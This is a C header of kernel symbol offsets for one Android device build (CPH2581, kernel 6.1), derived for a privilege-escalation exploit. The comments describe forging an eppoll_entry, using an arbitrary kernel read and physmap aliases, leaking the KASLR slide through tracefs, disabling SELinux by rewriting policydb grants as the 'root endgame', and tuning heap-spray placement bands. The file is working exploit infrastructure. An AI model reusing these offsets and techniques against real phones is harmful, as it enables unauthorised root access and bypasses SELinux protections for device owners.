/* CPH2581-15.0.0.860 -- offsets into one kernel image.
 *
 * Named for the device-build these offsets were derived for. The banner that
 * identifies the image:
 *
 *   Linux version 6.1.118-android14-11-o-g818f2506c9e7 (build-user@build-host)
 *   (Android (10087095, +pgo, +bolt, +lto, -mlgo, based on r487747c) clang
 *   version 17.0.2 ...), LLD 17.0.2) #1 SMP PREEMPT Fri Aug 29 10:04:51 UTC 2025
 *
 * The Image was extracted from the India CPH2573 15.0.0.860 OTA boot
 * (boot SHA-256 c07125dc7048af293a24be05ff037a31a597fdd67c43042b6811d6ba05c5ccfb,
 * Image SHA-256 bacaae948fcb328352e84bb589626756c37dba358e789f451924402c3990a91b);
 * its full banner and embedded config are byte-identical to the EEA CPH2581
 * 15.0.0.860 running kernel (recorded in the port campaign's image-comparison notes),
 * which is strong evidence but not whole-image verification. A committed
 * harvest-live pass on the device remains the final closure.
 *
 * A symbol offset is a fact about an image, not about a phone. Interface-level
 * struct offsets are deliberately absent here: they belong to
 * targets/kmi/android14-6.1.h, whose plain (unsuffixed) form the sources print
 * directly; redefining them here would shadow those with ULL-suffixed values.
 *
 * Derived by tools/pixel-image/derive_offsets.py from the image itself; the
 * same command re-derives them, and --compare checks a committed header
 * against the image it claims to describe.
 */
#ifndef CPH2581_15_0_0_860_H
#define CPH2581_15_0_0_860_H

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL

/* Derived: profile=android14-6.1, VA_BITS=39, PAGE_SHIFT=12,
 * sizeof(struct page)=64 (Image BTF), VMEMMAP_SIZE=0x200000000 */
#define VMEMMAP_START                              0xfffffffe00000000ULL

/* the wake callback a forged eppoll_entry names as its .func */
#define EP_POLL_CALLBACK_OFF                       0x000b973cULL

#define ANON_PIPE_BUF_OPS_OFF                      0x01104b50ULL
#define LINUX_BANNER_OFF                           0x012c3390ULL
#define INPUT_DEV_LIST_OFF                         0x0218d200ULL
#define SELINUX_ENFORCING_OFF                      0x0228b8a9ULL
#define SELINUX_BLOB_SIZES_OFF                     0x015cedf8ULL
/* arm64 global kimage_voffset = runtime _text VA - physical _text address
 * (candidate-kallsyms: ffffffc0095cdfe0 D kimage_voffset; offset vs _text
 * ffffffc008000000). The reader reads it through its arbitrary read and
 * hands the writer the kernel's TRUE physical text load; P0_KERNEL_PHYS_LOAD
 * (Pixel panther constant 0x80000000) is NOT valid on SM8650 -- draw 25's
 * FFROOT_FULL panic was the first kd_image use, and a wrong load base lands
 * the computed physmap alias in this device's unmapped memory holes. */
#define KIMAGE_VOFFSET_OFF                         0x015cdfe0ULL
/* struct selinux_state (kallsyms selinux_state ffffffc00a28b8a8): the .policy
 * pointer sits at +0x50 (BTF); the physmap alias of state+0x50 yields the
 * selinux_policy*, whose sidtab@0x0 carries the initial-SID table used for
 * the SID-candidate dump. */
#define SELINUX_STATE_OFF                          0x0228b8a8ULL
/* modprobe_path (kallsyms ffffffc00a062a18 D, image-relative): recorded for
 * image completeness. This kernel compiles CONFIG_STATIC_USERMODEHELPER=""
 * so call_usermodehelper_setup overwrites any path we write here with the
 * empty static path -- the classic overwrite flow is dead; the root
 * endgame is the live policydb grants instead (see the live policydb avtab grants in ffroot_w). */
#define MODPROBE_PATH_OFF                          0x02062a18ULL

#define INIT_TASK_OFF                              0x0204fc80ULL
#define ROOT_TASK_GROUP_OFF                        0x022375c0ULL
#define SECURITY_HOOK_HEADS_OFF                    0x015ce6e8ULL
#define KMALLOC_CACHES_OFF                         0x015ce230ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF          0x008e7638ULL
#define SYSTEM_UNBOUND_WQ_OFF                      0x0203b3a0ULL

#define ASHMEM_IOCTL_OFF                           0x001042a8ULL
#define ASHMEM_COMPAT_IOCTL_OFF                    0x00baf1a4ULL
#define ASHMEM_MMAP_OFF                            0x00675a48ULL
#define ASHMEM_OPEN_OFF                            0x00675c78ULL
#define ASHMEM_RELEASE_OFF                         0x00675d00ULL
#define ASHMEM_SHOW_FDINFO_OFF                     0x00baf1fcULL
#define ASHMEM_MISC_FOPS_OFF                       0x021aca78ULL
#define ASHMEM_FOPS_OFF                            0x01279010ULL
#define CONFIGFS_READ_ITER_OFF                     0x00b59ea4ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF                0x00b5a230ULL
#define COPY_SPLICE_READ_OFF                       0x0040bd38ULL
#define NOOP_LLSEEK_OFF                            0x004c8c74ULL

#define ASHMEM_IOCTL_CALLABLE_OFF                  0x001042a8ULL
#define ASHMEM_COMPAT_IOCTL_CALLABLE_OFF           0x00baf1a4ULL
#define ASHMEM_MMAP_CALLABLE_OFF                   0x00675a48ULL
#define ASHMEM_OPEN_CALLABLE_OFF                   0x00675c78ULL
#define ASHMEM_RELEASE_CALLABLE_OFF                0x00675d00ULL
#define ASHMEM_SHOW_FDINFO_CALLABLE_OFF            0x00baf1fcULL
#define COPY_SPLICE_READ_CALLABLE_OFF              0x0040bd38ULL
#define CONFIGFS_READ_ITER_CALLABLE_OFF            0x00b59ea4ULL
#define CONFIGFS_BIN_WRITE_ITER_CALLABLE_OFF       0x00b5a230ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF 0x008e7638ULL

#define SLIDE_NFULNL_LOGGER_OFF                    0x02043038ULL
#define SLIDE_SYSCTL_BOOTID_OFF                    0x023ae1c8ULL
#define SLIDE_LOGGERS_0_1_OFF                      0x02042f88ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF              0x021680d8ULL
/* Measured live 2026-10-08 (the port campaign's shot-1 diagnostics): the
 * tracefs marker path executes the LOCAL duplicate of tracing_mark_write
 * (kallsyms 't' at 0x4452fc, not the exported 'T' at 0x2ddd30), and the
 * recorded _THIS_IP_ is the site at fn+0x164. Validated: recovered pointer
 * low-21 bits match 0x445460, slide 2MiB-aligned inside [1,3) TiB window. */
#define SLIDE_TRACE_MARK_IP_OFF                    0x00445460ULL

/* mm_struct.owner -> task_struct* (Image BTF; not a KMI-guaranteed offset,
 * so it lives here rather than in the interface header) */
#define MM_OWNER_OFF                               0x338
#define SWAPPER_PG_DIR_OFF                         0x01bf5000ULL

/* Guess band: the WIDENED [762,997] permille ([34.0,42.1] GiB) covering
 * this device's whole populated high bank, kept over the original Pixel
 * band [905,930] ([39.98,41.03] GiB) after the survey evidence went both
 * ways (one boot's fine survey concentrated 97.5% of spray mass in
 * [40,41); later complete sessions landed inside the original band too,
 * and the campaign census found the guess term flat across band variants
 * -- the reclaim term, not the band, was the bottleneck). CAVEAT:
 * per-boot placement variability suspected -- keep FFREAD_BAND_SURVEY=1
 * on every CONFIRMED draw to accumulate per-boot maps. */
#define LIB_ZONEGUESS_BAND_LO                      762
#define LIB_ZONEGUESS_BAND_HI                      997

#endif /* CPH2581_15_0_0_860_H */
